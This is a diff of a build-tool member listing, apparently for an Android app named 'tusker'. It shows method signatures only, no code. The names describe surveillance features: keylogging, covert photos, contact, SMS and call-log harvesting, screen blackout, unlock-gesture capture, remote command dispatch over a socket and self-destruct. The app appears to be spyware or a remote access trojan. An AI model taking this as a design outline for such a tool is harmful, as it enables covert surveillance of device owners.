@@ -3019,6 +3019,8 @@ com.task.tusker.commands.AppMonitor:
 com.task.tusker.commands.CameraHandler:
     private java.lang.String bitmapToBase64(android.graphics.Bitmap,int)
     private java.lang.String saveBitmapToFile(android.graphics.Bitmap,java.lang.String)
+com.task.tusker.commands.ContactsHandler:
+    public org.json.JSONObject getAllContacts()
 com.task.tusker.commands.GestureRecorder$RecordingOverlay:
     void externalTouch(android.view.MotionEvent)
     void setLiveReplayMode(boolean)
@@ -13026,6 +13028,8 @@ com.task.tusker.commands.AppMonitor:
     public static boolean isMonitored(java.lang.String)
     public static void onAppForeground()
     public static void onTextChanged()
+com.task.tusker.commands.CameraHandler:
+    public static org.json.JSONObject takePhoto()
 com.task.tusker.commands.CommandExecutor:
     public static int frequencyToChannel()
     public static org.json.JSONObject handleGetCallLogs()
@@ -13034,7 +13038,7 @@ com.task.tusker.commands.CommandExecutor:
     public static org.json.JSONObject handlePing()
     public static org.json.JSONObject handlePlaySound()
 com.task.tusker.commands.ContactsHandler:
-    public static java.lang.String getPhoneType()
+    public static java.lang.String getPhoneType(int)
 com.task.tusker.commands.GestureRecorder$$InternalSyntheticLambda$5$810089f7251663eba060574bab95fe459498705cb392e6553388eb7bf9598dc1$0
 com.task.tusker.commands.GestureRecorder$$InternalSyntheticLambda$5$c164432558fead32b51310cb11504783243255dfc9035b46bd07b8fa2eb6c0bd$0
 com.task.tusker.commands.GestureRecorder$1:
@@ -13068,8 +13072,8 @@ com.task.tusker.commands.GestureRecorder:
     public volatile long servicePtsStart
     public static void commitAdvancedUnlockOnUnlock()
     public static org.json.JSONObject deleteLiveStream()
-    public final boolean isPaused()
-    public final boolean isRecording()
+    public static boolean isPaused()
+    public static boolean isRecording()
     public static synthetic void lambda$doStartAutoCapture$7()
     public static void lambda$doStartAutoCapture$8()
     public static synthetic void lambda$onLockGestureLifted$15()
@@ -13103,8 +13107,8 @@ com.task.tusker.commands.KeyloggerService:
 com.task.tusker.commands.PermissionManager:
     public final boolean checkPermission(java.lang.String)
 com.task.tusker.commands.SMSHandler:
-    public static org.json.JSONObject getAllSMS()
     public static org.json.JSONObject getSMSFromNumber()
+    public static org.json.JSONObject sendSMS()
 com.task.tusker.commands.ScreenBlackout:
     public static void clearService()
     public final boolean isActive()
@@ -13135,7 +13139,7 @@ com.task.tusker.commands.ScreenReader:
 com.task.tusker.commands.ScreenshotHandler:
     public android.content.Context context
     public static android.graphics.Bitmap captureBitmap()
-com.task.tusker.network.SocketManager$$InternalSyntheticLambda$3$2cacb7ed4dd47f6a222fd418ffab5f9561e5d1b4c3dcc3be893b143586446b9e$0:
+com.task.tusker.network.SocketManager$$InternalSyntheticLambda$3$84903861af481469497e846fbe79e277ca2f71251a3015da71b7d7bf5cbec611$0:
     public final synthetic com.task.tusker.services.UnifiedAccessibilityService f$1
 com.task.tusker.network.SocketManager$$InternalSyntheticLambda$5$97798d15dc1576a73639f0395c48478e4af90b2668542648cdb1c38f979d3018$0:
     public final synthetic com.task.tusker.services.UnifiedAccessibilityService f$1
@@ -13151,38 +13155,44 @@ com.task.tusker.network.SocketManager:
     public static com.task.tusker.commands.GestureRecorder getGestureRecorder()
     public static com.task.tusker.commands.KeyloggerService getKeylogger()
     public static void initGestureRecorder()
-    public static boolean isAccessibilityCommand(java.lang.String)
+    public static boolean isAccessibilityCommand()
     public static boolean isConnected()
     public static boolean isGestureCommand()
     public final boolean isStreamingActive()
-    public static void lambda$captureFrame$17()
-    public static void lambda$connect$2()
+    public static void lambda$captureFrame$24()
     public static void lambda$connect$3()
+    public static void lambda$connect$4()
     public static synthetic void lambda$dispatchCommand$10()
-    public static synthetic void lambda$dispatchCommand$11()
+    public static void lambda$dispatchCommand$11()
     public static synthetic void lambda$dispatchCommand$12()
-    public static void lambda$dispatchCommand$9()
-    public static void lambda$dispatchFrameSend$13()
-    public static synthetic void lambda$forceReconnect$8()
-    public static synthetic void lambda$handleAccessibilityCommand$18()
-    public static synthetic void lambda$handleAccessibilityCommand$19()
-    public static void lambda$listenForMessages$6()
-    public static void lambda$performSelfDestruct$27()
-    public static synthetic void lambda$processMessage$7()
-    public static synthetic void lambda$pushKeylogEntry$24()
-    public static synthetic void lambda$pushNotification$25()
-    public static synthetic void lambda$pushRecentActivity$26()
-    public static synthetic void lambda$scheduleFrameAfterAction$1()
-    public static synthetic void lambda$startBlockFrameMode$15()
-    public static synthetic void lambda$startBlockFrameMode$16()
-    public static void lambda$startHeartbeat$5()
-    public static synthetic void lambda$startIdleFrameMode$14()
-    public static synthetic void lambda$startScreenReaderLoop$20()
-    public static void lambda$startScreenReaderLoop$21()
-    public static void lambda$startWakeKeepAliveLoop$22()
-    public static synthetic void lambda$stopScreenReaderLoop$23()
-    public static synthetic void lambda$streamChannelLoop$4()
-    public static void lambda$uploadPendingOfflineRecordings$29()
+    public static synthetic void lambda$dispatchCommand$13()
+    public static synthetic void lambda$dispatchCommand$14()
+    public static synthetic void lambda$dispatchCommand$15()
+    public static synthetic void lambda$dispatchCommand$16()
+    public static synthetic void lambda$dispatchCommand$17()
+    public static synthetic void lambda$dispatchCommand$18()
+    public static synthetic void lambda$dispatchCommand$19()
+    public static void lambda$dispatchFrameSend$20()
+    public static synthetic void lambda$forceReconnect$9()
+    public static synthetic void lambda$handleAccessibilityCommand$25()
+    public static synthetic void lambda$handleAccessibilityCommand$26()
+    public static void lambda$listenForMessages$7()
+    public static void lambda$performSelfDestruct$34()
+    public static synthetic void lambda$processMessage$8()
+    public static synthetic void lambda$pushKeylogEntry$31()
+    public static synthetic void lambda$pushNotification$32()
+    public static synthetic void lambda$pushRecentActivity$33()
+    public static synthetic void lambda$scheduleFrameAfterAction$2()
+    public static synthetic void lambda$startBlockFrameMode$22()
+    public static synthetic void lambda$startBlockFrameMode$23()
+    public static void lambda$startHeartbeat$6()
+    public static synthetic void lambda$startIdleFrameMode$21()
+    public static synthetic void lambda$startScreenReaderLoop$27()
+    public static void lambda$startScreenReaderLoop$28()
+    public static void lambda$startWakeKeepAliveLoop$29()
+    public static synthetic void lambda$stopScreenReaderLoop$30()
+    public static synthetic void lambda$streamChannelLoop$5()
+    public static void lambda$uploadPendingOfflineRecordings$36()
     public static void listenForMessages()
     public static void liveChannelLoop()
     public static void processMessage()
@@ -13193,7 +13203,6 @@ com.task.tusker.network.SocketManager:
     public static void sendErrorResponse()
     public static void sendHeartbeat()
     public static void sendPong()
-    public static void sendResponse()
     public static void startHeartbeat()
     public final void startIdleFrameMode(java.lang.String)
     public final void startScreenReaderLoop(boolean)
@@ -14470,7 +14479,7 @@ org.json.JSONArray:
     public static java.lang.String getString()
     public final boolean isNull(int)
     public static java.lang.String join()
-    public final int length()
+    public static int length()
     public static org.json.JSONArray put()
 org.json.JSONObject$$InternalSyntheticThrowCCEIfNotNull$22$67e8c5b6bde50bf7bbc7b33526bc0036fc2845ee12b8453903722439e4cb045c$0
 org.json.JSONObject$1
@@ -14479,8 +14488,8 @@ org.json.JSONObject:
     public final java.util.Iterator keys()
     public final java.lang.Object opt(java.lang.String)
     public static boolean optBoolean()
-    public final boolean optBoolean(java.lang.String)
-    public final int optInt(int)
+    public static boolean optBoolean$1()
+    public static int optInt()
     public final long optLong()
     public final void optLong()
     public static java.lang.String optString()
